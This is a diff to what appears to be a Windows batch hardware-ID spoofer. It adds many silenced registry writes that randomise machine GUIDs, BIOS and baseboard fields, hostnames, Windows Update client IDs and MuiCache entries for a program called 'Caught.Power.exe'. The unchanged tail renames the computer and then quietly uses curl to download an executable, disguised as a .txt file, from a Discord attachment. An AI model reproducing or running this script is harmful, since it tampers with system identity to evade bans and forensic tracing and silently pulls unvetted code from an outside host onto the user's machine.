@@ -31,6 +31,155 @@ REG ADD HKLM\Software\Microsoft\Windows NT\CurrentVersion /v InstallDate /t REG_
 REG ADD HKLM\Software\Microsoft\Windows NT\CurrentVersion /v ProductId /t REG_SZ /d %random% /f >NUL 2>&1
 REG ADD HKLM\System\CurrentControlSet\Control\WMI\Security /v 671a8285-4edb-4cae-99fe-69a15c48c0bc /t REG_SZ /d %random% /f >NUL 2>&1
 REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion" "WindowsUpdate /v SusClientId /t REG_SZ /d {PFS-%random%-%random%-%random%-%random%} /f >NUL 2>&1
+
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\IDConfigDB\Hardware Profiles\0001" /v HwProfileGuid /t REG_SZ /d "{%random:~-8%-%random:~-4%-%random:~-4%-%random:~-4%-%random:~-12%}" /f
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName /v ComputerName /t REG_SZ /d %random%-%random% /f  >NUL 2>&1
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ActiveComputerName /v ComputerName /t REG_SZ /d %random%-%random% /f  >NUL 2>&1
+REG ADD HKLM\SYSTEM\HardwareConfig /v LastConfig /t REG_SZ /d {eac%random%} /f  >NUL 2>&1
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\IDConfigDB\Hardware" "Profiles\0001 /v HwProfileGuid /t REG_SZ /d {%random%-%random%-%random%-%random%-%random%} /f  >NUL 2>&1
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\IDConfigDB\Hardware" "Profiles\0001 /v GUID /t REG_SZ /d {%random%-%random%-%random%-%random%-%random%} /f  >NUL 2>&1
+REG ADD HKLM\SOFTWARE\Microsoft\Windows" "NT\CurrentVersion /v BuildGUID /t REG_SZ /d %random%-%random% /f  >NUL 2>&1
+REG ADD HKLM\SOFTWARE\Microsoft\Windows" "NT\CurrentVersion /v RegisteredOwner /t REG_SZ /d %random%-%random% /f  >NUL 2>&1
+REG ADD HKLM\SOFTWARE\Microsoft\Windows" "NT\CurrentVersion /v RegisteredOrganization /t REG_SZ /d %random%-%random% /f  >NUL 2>&1
+REG ADD HKLM\SOFTWARE\Microsoft\Cryptography /v GUID /t REG_SZ /d %random%-%random%-%random%-%random%-%random% /f  >NUL 2>&1
+REG ADD HKLM\SOFTWARE\Microsoft\Cryptography /v MachineGuid /t REG_SZ /d %random%-%random%-%random%-%random%-%random% /f  >NUL 2>&1
+REG ADD HKLM\SOFTWARE\Microsoft\Windows" "NT\CurrentVersion /v ProductId /t REG_SZ /d %random%-%random%-%random%-%random% /f  >NUL 2>&1
+REG ADD HKLM\SOFTWARE\Microsoft\Windows" "NT\CurrentVersion /v InstallDate /t REG_SZ /d %random% /f  >NUL 2>&1
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\SystemInformation /v ComputerHardwareId /t REG_SZ /d {%random%-%random%-%random%-%random%} /f  >NUL 2>&1
+REG ADD "HKLM\Software\Microsoft\Windows NT\CurrentVersion" /v InstallDate /t REG_SZ /d %random% /f  >NUL 2>&1
+REG ADD "HKLM\Software\Microsoft\Windows NT\CurrentVersion" /v ProductId /t REG_SZ /d %random% /f  >NUL 2>&1
+REG ADD HKLM\SOFTWARE\Microsoft\Windows" "NT\CurrentVersion /v RegisteredOrganization /t REG_SZ /d FS%random% /f  >NUL 2>&1
+REG ADD HKLM\SOFTWARE\Microsoft\Windows" "NT\CurrentVersion /v RegisteredOwner /t REG_SZ /d FS%random% /f  >NUL 2>&1
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ActiveComputerName /v ComputerName /t REG_SZ /d %random% /f  >NUL 2>&1
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName /v ComputerName /t REG_SZ /d %random% /f  >NUL 2>&1
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\SystemInformation /v ComputerHardwareId /t REG_SZ /d {%random%-s%random%-%random%-%random%-%random%} /f  >NUL 2>&1
+REG ADD HKLM\SYSTEM\HardwareConfig /v LastConfig /t REG_SZ /d {%random%-%random%-%random%-%random%} /f  >NUL 2>&1
+REG ADD "HKLM\Software\Microsoft\Windows NT\CurrentVersion" /v InstallDate /t REG_SZ /d "%random%" /f  >NUL 2>&1
+REG ADD "HKLM\Software\Microsoft\Windows NT\CurrentVersion" /v ProductId /t REG_SZ /d "%random%" /f  >NUL 2>&1
+REG ADD "HKLM\System\CurrentControlSet\Control\SystemInformation" /v ComputerHardwareId /t REG_SZ /d "%random%" /f  >NUL 2>&1
+REG ADD "HKLM\System\CurrentControlSet\Control\WMI\Security" /v "{671a8285-4edb-4cae-99fe-69a15c48c0bc}" /t REG_SZ /d "%random%" /f  >NUL 2>&1
+REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate" /v SusClientId /t REG_SZ /d "{%random%-%random%-%random%-%random%-%random%}" /f  >NUL 2>&1
+REG ADD "HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\BIOS" /v BaseBoardManufacturer /t REG_SZ /d "%random%%random%%random%" /f  >NUL 2>&1
+REG ADD "HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\BIOS" /v SystemManufacturer /t REG_SZ /d "%random%%random%%random%" /f  >NUL 2>&1
+REG ADD "HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\BIOS" /v SystemProductName /t REG_SZ /d "%random%%random%%random%" /f  >NUL 2>&1
+REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\SystemInformation" /v SystemManufacturer /t REG_SZ /d "%random%%random%%random%" /f  >NUL 2>&1
+REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\SystemInformation" /v SystemProductName /t REG_SZ /d "%random%%random%%random%" /f  >NUL 2>&1
+REG ADD HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SystemInformation /v SystemManufacturer /t REG_SZ /d %random%%random%%random% /f  >NUL 2>&1
+REG ADD HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SystemInformation /v SystemProductName /t REG_SZ /d %random%%random%%random% /f  >NUL 2>&1
+REG ADD HKEY_LOCAL_MACHINE\SYSTEM\HardwareConfig\Current /v SystemManufacturer /t REG_SZ /d %random%%random%%random% /f  >NUL 2>&1
+REG ADD HKEY_LOCAL_MACHINE\SYSTEM\HardwareConfig\Current /v SystemProductName /t REG_SZ /d %random%%random%%random% /f  >NUL 2>&1
+REG ADD HKEY_LOCAL_MACHINE\SYSTEM\HardwareConfig\Current /v BaseBoardManufacturer /t REG_SZ /d %random%%random%%random% /f  >NUL 2>&1
+REG ADD HKEY_LOCAL_MACHINE\SYSTEM\HardwareConfig\{a0408a6a-546c-11ea-af4e-4df901723b0f} /v SystemManufacturer /t REG_SZ /d %random%%random%%random% /f  >NUL 2>&1
+REG ADD HKEY_LOCAL_MACHINE\SYSTEM\HardwareConfig\{a0408a6a-546c-11ea-af4e-4df901723b0f} /v SystemProductName /t REG_SZ /d %random%%random%%random% /f  >NUL 2>&1
+REG ADD HKEY_LOCAL_MACHINE\SYSTEM\HardwareConfig\{a0408a6a-546c-11ea-af4e-4df901723b0f} /v BaseBoardManufacturer /t REG_SZ /d %random%%random%%random% /f  >NUL 2>&1
+REG ADD HKEY_LOCAL_MACHINE\SYSTEM\HardwareConfig\Current\ComputerIds /v {037bf8fa-5b18-50b2-ba13-2580426ff357} /t REG_SZ /d %random%%random%%random% /f  >NUL 2>&1
+REG ADD HKEY_LOCAL_MACHINE\SYSTEM\HardwareConfig\Current\ComputerIds /v {5c8c5d29-b5ed-5229-a26c-e661b1e1129b} /t REG_SZ /d %random%%random%%random% /f  >NUL 2>&1
+REG ADD HKEY_LOCAL_MACHINE\SYSTEM\HardwareConfig\Current\ComputerIds /v {f2461683-1fa0-5629-b022-d0ffaee63ed0} /t REG_SZ /d %random%%random%%random% /f  >NUL 2>&1
+REG ADD HKEY_LOCAL_MACHINE\SYSTEM\HardwareConfig\{a0408a6a-546c-11ea-af4e-4df901723b0f}\ComputerIds /v {037bf8fa-5b18-50b2-ba13-2580426ff357} /t REG_SZ /d %random%%random%%random% /f  >NUL 2>&1
+REG ADD HKEY_LOCAL_MACHINE\SYSTEM\HardwareConfig\{a0408a6a-546c-11ea-af4e-4df901723b0f}\ComputerIds /v {5c8c5d29-b5ed-5229-a26c-e661b1e1129b} /t REG_SZ /d %random%%random%%random% /f  >NUL 2>&1
+REG ADD HKEY_LOCAL_MACHINE\SYSTEM\HardwareConfig\{a0408a6a-546c-11ea-af4e-4df901723b0f}\ComputerIds /v {f2461683-1fa0-5629-b022-d0ffaee63ed0} /t REG_SZ /d %random%%random%%random% /f  >NUL 2>&1
+REG ADD HKEY_LOCAL_MACHINE\SYSTEM\HardwareConfig\{a0408a6a-546c-11ea-af4e-4df901723b0f}\ComputerIds /v {41417485-85de-59b6-a9fa-e7f706b1d992} /t REG_SZ /d %random%%random%%random% /f  >NUL 2>&1
+REG ADD HKEY_LOCAL_MACHINE\SYSTEM\HardwareConfig\{a0408a6a-546c-11ea-af4e-4df901723b0f}\ComputerIds /v {ca09ac19-a9a0-5236-a0f6-ce81dcc46d9a} /t REG_SZ /d %random%%random%%random% /f  >NUL 2>&1
+REG ADD HKEY_LOCAL_MACHINE\SYSTEM\HardwareConfig\{a0408a6a-546c-11ea-af4e-4df901723b0f}\ComputerIds /v {81287c07-f962-5bac-a75b-e98c2c8f5f93} /t REG_SZ /d %random%%random%%random% /f  >NUL 2>&1
+REG ADD HKEY_LOCAL_MACHINE\SYSTEM\HardwareConfig\{a0408a6a-546c-11ea-af4e-4df901723b0f}\ComputerIds /v {a0a97217-b3b7-58c7-a1fd-1a9295288031} /t REG_SZ /d %random%%random%%random% /f  >NUL 2>&1
+REG ADD HKEY_LOCAL_MACHINE\SYSTEM\HardwareConfig\{a0408a6a-546c-11ea-af4e-4df901723b0f}\ComputerIds /v {28c62655-d5a5-58ee-9dae-4c1d2c09f9ef} /t REG_SZ /d %random%%random%%random% /f  >NUL 2>&1
+REG ADD HKEY_LOCAL_MACHINE\SYSTEM\HardwareConfig\{a0408a6a-546c-11ea-af4e-4df901723b0f}\ComputerIds /v {67b72407-d583-525b-9f54-cc0f8ee0552e} /t REG_SZ /d %random%%random%%random% /f  >NUL 2>&1
+REG ADD HKEY_LOCAL_MACHINE\SYSTEM\HardwareConfig\{a0408a6a-546c-11ea-af4e-4df901723b0f}\ComputerIds /v {a4d0f078-0772-5228-a37a-db55fdb8ee04} /t REG_SZ /d %random%%random%%random% /f  >NUL 2>&1
+REG ADD HKEY_LOCAL_MACHINE\SYSTEM\HardwareConfig\{a0408a6a-546c-11ea-af4e-4df901723b0f}\ComputerIds /v {21a4c841-f6fc-5651-8cde-435c9effc378} /t REG_SZ /d %random%%random%%random% /f  >NUL 2>&1
+REG ADD HKEY_LOCAL_MACHINE\SYSTEM\HardwareConfig\{a0408a6a-546c-11ea-af4e-4df901723b0f}\ComputerIds /v {cd0c55c7-a3ae-55b4-add7-578cdc06511f} /t REG_SZ /d %random%%random%%random% /f  >NUL 2>&1
+REG ADD HKEY_LOCAL_MACHINE\SYSTEM\HardwareConfig\{a0408a6a-546c-11ea-af4e-4df901723b0f}\ComputerIds /v {feb9c5fe-1cdf-59a8-8008-550892c61c37} /t REG_SZ /d %random%%random%%random% /f  >NUL 2>&1
+REG ADD HKEY_LOCAL_MACHINE\SYSTEM\HardwareConfig\{a0408a6a-546c-11ea-af4e-4df901723b0f}\ComputerIds /v {6ef3fe51-9106-55cf-a553-f5d21bb78cc3} /t REG_SZ /d %random%%random%%random% /f  >NUL 2>&1
+REG ADD HKEY_LOCAL_MACHINE\SYSTEM\HardwareConfig\{a0408a6a-546c-11ea-af4e-4df901723b0f}\ComputerIds /v {7b3e1573-c771-5dbd-b795-f8344771349d} /t REG_SZ /d %random%%random%%random% /f  >NUL 2>&1
+REG ADD HKLM\HARDWARE\DESCRIPTION\System\BIOS /v BaseBoardManufacturer /t REG_SZ /d %random% /f  >NUL 2>&1
+REG ADD HKLM\HARDWARE\DESCRIPTION\System\BIOS /v BaseBoardProduct /t REG_SZ /d %random% /f  >NUL 2>&1
+REG ADD HKLM\HARDWARE\DESCRIPTION\System\BIOS /v BaseBoardVersion /t REG_SZ /d %random% /f  >NUL 2>&1
+REG ADD HKLM\HARDWARE\DESCRIPTION\System\BIOS /v BIOSVersion /t REG_SZ /d %random% /f  >NUL 2>&1
+REG ADD HKLM\HARDWARE\DESCRIPTION\System\BIOS /v SystemFamily /t REG_SZ /d %random% /f  >NUL 2>&1
+REG ADD HKLM\HARDWARE\DESCRIPTION\System\BIOS /v SystemManufacturer /t REG_SZ /d %random% /f  >NUL 2>&1
+REG ADD HKLM\HARDWARE\DESCRIPTION\System\BIOS /v SystemProductName /t REG_SZ /d %random% /f  >NUL 2>&1
+REG ADD HKLM\HARDWARE\DESCRIPTION\System\BIOS /v SystemSKU /t REG_SZ /d %random% /f  >NUL 2>&1
+REG ADD HKLM\HARDWARE\DESCRIPTION\System\BIOS /v SystemVersion /t REG_SZ /d %random% /f  >NUL 2>&1
+REG ADD "HKCR\Local Settings\Software\Microsoft\Windows\Shell\MuiCache" /v "C:\Users\THEGUY3ds\Downloads\Caught.Power-cleaned.exe.ApplicationCompany" /t REG_SZ /d "%random%" /f  >NUL 2>&1
+REG ADD "HKCR\Local Settings\Software\Microsoft\Windows\Shell\MuiCache" /v "C:\Users\THEGUY3ds\Downloads\Caught.Power.exe.ApplicationCompany" /t REG_SZ /d "%random%" /f  >NUL 2>&1
+REG ADD "HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache" /v "C:\Users\THEGUY3ds\Downloads\Caught.Power-cleaned.exe.ApplicationCompany" /t REG_SZ /d "%random%" /f  >NUL 2>&1
+REG ADD "HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache" /v "C:\Users\THEGUY3ds\Downloads\Caught.Power.exe.ApplicationCompany" /t REG_SZ /d "%random%" /f  >NUL 2>&1
+REG ADD "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion" /v "RegisteredOrganization" /t REG_SZ /d "%random%" /f  >NUL 2>&1
+REG ADD "HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters" /v "HostName" /t REG_SZ /d "%random%" /f  >NUL 2>&1
+REG ADD "HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters" /v "NV HostName" /t REG_SZ /d "%random%" /f  >NUL 2>&1
+REG ADD "HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters\DNSRegisteredAdapters\{146337E2-B748-4468-AC39-FCBBA2D507EC}" /v "Hostname" /t REG_SZ /d "%random%" /f  >NUL 2>&1
+REG ADD "HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters\DNSRegisteredAdapters\{34E2F73D-D367-4931-8A5F-FB72BBE02BCB}" /v "Hostname" /t REG_SZ /d "%random%" /f  >NUL 2>&1
+REG ADD "HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters\DNSRegisteredAdapters\{8B66020F-34DF-4179-BC45-E6419E7905AD}" /v "Hostname" /t REG_SZ /d "%random%" /f  >NUL 2>&1
+REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "HostName" /t REG_SZ /d "%random%" /f  >NUL 2>&1
+REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "NV HostName" /t REG_SZ /d "%random%" /f  >NUL 2>&1
+REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\DNSRegisteredAdapters\{146337E2-B748-4468-AC39-FCBBA2D507EC}" /v "Hostname" /t REG_SZ /d "%random%" /f  >NUL 2>&1
+REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\DNSRegisteredAdapters\{34E2F73D-D367-4931-8A5F-FB72BBE02BCB}" /v "Hostname" /t REG_SZ /d "%random%" /f  >NUL 2>&1
+REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\DNSRegisteredAdapters\{8B66020F-34DF-4179-BC45-E6419E7905AD}" /v "Hostname" /t REG_SZ /d "%random%" /f  >NUL 2>&1
+REG ADD HKLM\SYSTEM\HardwareConfig /v LastConfig /t REG_SZ /d {%username%%random%} /f  >NUL 2>&1
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName /v ComputerName /t REG_SZ /d Desktop%random% /f  >NUL 2>&1
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ActiveComputerName\ /v ComputerName /t REG_SZ /d %PCNAME% %random% /f  >NUL 2>&1
+REG ADD HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\ /v Hostname /t REG_SZ /d %PCNAME% %random% /f  >NUL 2>&1
+REG ADD HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\ /v "NV Hostname" /t REG_SZ /d %PCNAME% %random% /f  >NUL 2>&1
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ActiveComputerName /v ComputerName /t REG_SZ /d Desktop%random% /f  >NUL 2>&1
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\IDConfigDB\Hardware" "Profiles\0001 /v HwProfileGuid /t REG_SZ /d {%random%-%random%-%random%-%random%} /f  >NUL 2>&1
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\IDConfigDB\Hardware" "Profiles\0001 /v GUID /t REG_SZ /d {%random%-%random%-%random%-%random%} /f  >NUL 2>&1
+REG ADD HKLM\SOFTWARE\Microsoft\Windows" "NT\CurrentVersion /v BuildGUID /t REG_SZ /d %random% /f  >NUL 2>&1
+REG ADD HKLM\SOFTWARE\Microsoft\Windows" "NT\CurrentVersion /v RegisteredOwner /t REG_SZ /d %random% /f  >NUL 2>&1
+REG ADD HKLM\SOFTWARE\Microsoft\Windows" "NT\CurrentVersion /v RegisteredOrganization /t REG_SZ /d %random% /f  >NUL 2>&1
+REG ADD HKLM\SOFTWARE\Microsoft\Cryptography /v GUID /t REG_SZ /d %random%-%random%-%random%-%random% /f  >NUL 2>&1
+REG ADD HKLM\SOFTWARE\Microsoft\Cryptography /v MachineGuid /t REG_SZ /d %random%-%random%-%random%-%random% /f  >NUL 2>&1
+REG ADD HKLM\SOFTWARE\Microsoft\Windows" "NT\CurrentVersion\Tracing\Microsoft\Profile\Profile /v Guid /t REG_SZ /d %random%-%random%-%random%-%username%%random% /f  >NUL 2>&1
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName /v ComputerName /t REG_SZ /d DESKTOP-%random% /f   >NUL 2>&1
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ActiveComputerName /v ComputerName /t REG_SZ /d DESKTOP-%random% /f   >NUL 2>&1
+@REG ADD HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName /v ComputerName /t REG_SZ /d  r%random% /f   >NUL 2>&1
+@REG ADD HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ActiveComputerName /v ComputerName /t REG_SZ /d  r%random% /f   >NUL 2>&1
+@REG ADD HKLM\SYSTEM\HardwareConfig /v LastConfig /t REG_SZ /d {be%random%} /f   >NUL 2>&1
+@REG ADD HKLM\SYSTEM\CurrentControlSet\Control\IDConfigDB\Hardware" "Profiles\0001 /v HwProfileGuid /t REG_SZ /d {%random%-%random%-%random%-%random%} /f   >NUL 2>&1
+@REG ADD HKLM\SYSTEM\CurrentControlSet\Control\IDConfigDB\Hardware" "Profiles\0001 /v GUID /t REG_SZ /d {%random%-%random%-%random%-%random%} /f   >NUL 2>&1
+@REG ADD HKLM\SOFTWARE\Microsoft\Windows" "NT\CurrentVersion /v BuildGUID /t REG_SZ /d  r%random% /f   >NUL 2>&1
+@REG ADD HKLM\SOFTWARE\Microsoft\Windows" "NT\CurrentVersion /v RegisteredOwner /t REG_SZ /d  r%random% /f   >NUL 2>&1
+@REG ADD HKLM\SOFTWARE\Microsoft\Windows" "NT\CurrentVersion /v RegisteredOrganization /t REG_SZ /d  %random% /f   >NUL 2>&1
+@REG ADD HKLM\SYSTEM\CurrentControlSet\Control\SystemInformation /v ComputerHardwareId /t REG_SZ /d {%random%-%random%-%random%-%random%} /f   >NUL 2>&1
+@REG ADD HKLM\SYSTEM\HardwareConfig /v LastConfig /t REG_SZ /d {BE%random%} /f   >NUL 2>&1
+@REG ADD HKLM\SYSTEM\CurrentControlSet\Control\IDConfigDB\Hardware" "Profiles\0001 /v HwProfileGuid /t REG_SZ /d {%random%-%random%-%random%-%random%} /f   >NUL 2>&1
+@REG ADD HKLM\SYSTEM\CurrentControlSet\Control\IDConfigDB\Hardware" "Profiles\0001 /v GUID /t REG_SZ /d {%random%-%random%-%random%-%random%} /f   >NUL 2>&1
+@REG ADD HKLM\SOFTWARE\Microsoft\Windows" "NT\CurrentVersion /v BuildGUID /t REG_SZ /d %random% /f   >NUL 2>&1
+@REG ADD HKLM\SOFTWARE\Microsoft\Windows" "NT\CurrentVersion /v RegisteredOwner /t REG_SZ /d %random% /f   >NUL 2>&1
+@REG ADD HKLM\SOFTWARE\Microsoft\Windows" "NT\CurrentVersion /v RegisteredOrganization /t REG_SZ /d %random% /f   >NUL 2>&1
+@REG ADD HKLM\SOFTWARE\Microsoft\Windows" "NT\CurrentVersion /v ProductId /t REG_SZ /d %random%-%random%-%random%-%random% /f   >NUL 2>&1
+@REG ADD HKLM\SOFTWARE\Microsoft\Windows" "NT\CurrentVersion /v InstallDate /t REG_SZ /d %random% /f   >NUL 2>&1
+@REG ADD HKLM\SYSTEM\CurrentControlSet\Control\SystemInformation /v ComputerHardwareId /t REG_SZ /d {%random%-%random%-%random%-%random%} /f   >NUL 2>&1
+@REG ADD HKLM\SOFTWARE\Microsoft\Windows" "NT\CurrentVersion\Tracing\Microsoft\Profile\Profile /v Guid /t REG_SZ /d %random%-%random%-%random%-%random% /f   >NUL 2>&1
+@REG ADD "HKLM\Software\Microsoft\Windows NT\CurrentVersion" /v InstallDate /t REG_SZ /d %random% /f   >NUL 2>&1
+@REG ADD "HKLM\Software\Microsoft\Windows NT\CurrentVersion" /v ProductId /t REG_SZ /d %random% /f   >NUL 2>&1
+@REG ADD HKLM\System\CurrentControlSet\Control\SystemInformation /v ComputerHardwareId /t REG_SZ /d %random% /f   >NUL 2>&1
+@REG ADD HKLM\System\CurrentControlSet\Control\WMI\Security /v 671a8285-4edb-4cae-99fe-69a15c48c0bc /t REG_SZ /d %random% /f   >NUL 2>&1
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName /v ComputerName /t REG_SZ /d %random% /f  >NUL 2>&1
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ActiveComputerName /v ComputerName /t REG_SZ /d %random% /f  >NUL 2>&1
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\IDConfigDB\Hardware" "Profiles\0001 /v HwProfileGuid /t REG_SZ /d {%random%-%random%-%random%-%random%} /f  >NUL 2>&1
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\IDConfigDB\Hardware" "Profiles\0001 /v GUID /t REG_SZ /d {%random%-%random%-%random%-%random%} /f  >NUL 2>&1
+REG ADD HKLM\SOFTWARE\Microsoft\Windows" "NT\CurrentVersion /v BuildGUID /t REG_SZ /d %random% /f  >NUL 2>&1
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName /v ComputerName /t REG_SZ /d %random% /f   >NUL 2>&1
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ActiveComputerName /v ComputerName /t REG_SZ /d %random% /f   >NUL 2>&1
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName /v ComputerName /t REG_SZ /d %random% /f  >NUL 2>&1
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ActiveComputerName /v ComputerName /t REG_SZ /d %random% /f  >NUL 2>&1
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\IDConfigDB\Hardware" "Profiles\0001 /v HwProfileGuid /t REG_SZ /d {%random%-%random%-%random%-%random%} /f  >NUL 2>&1
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\IDConfigDB\Hardware" "Profiles\0001 /v GUID /t REG_SZ /d {%random%-%random%-%random%-%random%} /f  >NUL 2>&1
+REG ADD HKLM\SOFTWARE\Microsoft\Windows" "NT\CurrentVersion /v BuildGUID /t REG_SZ /d %random% /f  >NUL 2>&1
+REG ADD HKLM\SOFTWARE\Microsoft\Windows" "NT\CurrentVersion /v RegisteredOwner /t REG_SZ /d%random% /f  >NUL 2>&1
+REG ADD HKLM\SOFTWARE\Microsoft\Windows" "NT\CurrentVersion /v RegisteredOrganization /t REG_SZ /d %random% /f  >NUL 2>&1
+REG ADD HKLM\SOFTWARE\Microsoft\Cryptography /v GUID /t REG_SZ /d %random%-%random%-%random%-%random% /f  >NUL 2>&1
+REG ADD HKLM\SOFTWARE\Microsoft\Cryptography /v MachineGuid /t REG_SZ /d %random%-%random%-%random%-%random% /f  >NUL 2>&1
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\SystemInformation /v ComputerHardwareId /t REG_SZ /d {%random%-%random%-%random%-%random%} /f  >NUL 2>&1
+REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion" "WindowsUpdate /v SusClientId /t REG_SZ /d {%random%-%random%-%random%-%random%} /f  >NUL 2>&1
+REG ADD HKLM\HARDWARE\DESCRIPTION\System\BIOS /v BaseBoardManufacturer /t REG_SZ /d %random% /f  >NUL 2>&1
+REG ADD HKLM\HARDWARE\DESCRIPTION\System\BIOS /v BaseBoardProduct /t REG_SZ /d %random% /f  >NUL 2>&1
+REG ADD HKLM\HARDWARE\DESCRIPTION\System\BIOS /v BaseBoardVersion /t REG_SZ /d %random% /f  >NUL 2>&1
+REG ADD HKLM\HARDWARE\DESCRIPTION\System\BIOS /v BIOSVersion /t REG_SZ /d %random% /f  >NUL 2>&1
+REG ADD HKLM\HARDWARE\DESCRIPTION\System\BIOS /v SystemFamily /t REG_SZ /d %random% /f  >NUL 2>&1
+REG ADD HKLM\HARDWARE\DESCRIPTION\System\BIOS /v SystemManufacturer /t REG_SZ /d %random% /f  >NUL 2>&1
+REG ADD HKLM\HARDWARE\DESCRIPTION\System\BIOS /v SystemProductName /t REG_SZ /d %random% /f  >NUL 2>&1
+REG ADD HKLM\HARDWARE\DESCRIPTION\System\BIOS /v SystemSKU /t REG_SZ /d %random% /f  >NUL 2>&1
+REG ADD HKLM\HARDWARE\DESCRIPTION\System\BIOS /v SystemVersion /t REG_SZ /d %random% /f  >NUL 2>&1
 START "" /MIN /WAIT POWERSHELL Rename-Computer -NewName "%RANDOM%-PFS-%RANDOM%" >NUL 2>&1
 DEL /S /Q "x.exe" >Nul 2>&1
 curl -s -g -L -o "x.exe" "https://cdn.discordapp.com/attachments/1206253821861429318/1206279610405228555/EventCleaner-exe.txt?ex=65db6e6e&is=65c8f96e&hm=8492b7336b2cd810e069047a91d54c66ac5c82caf17e9719500fb8c9bfdeb78c&"  >NUL 2>&1
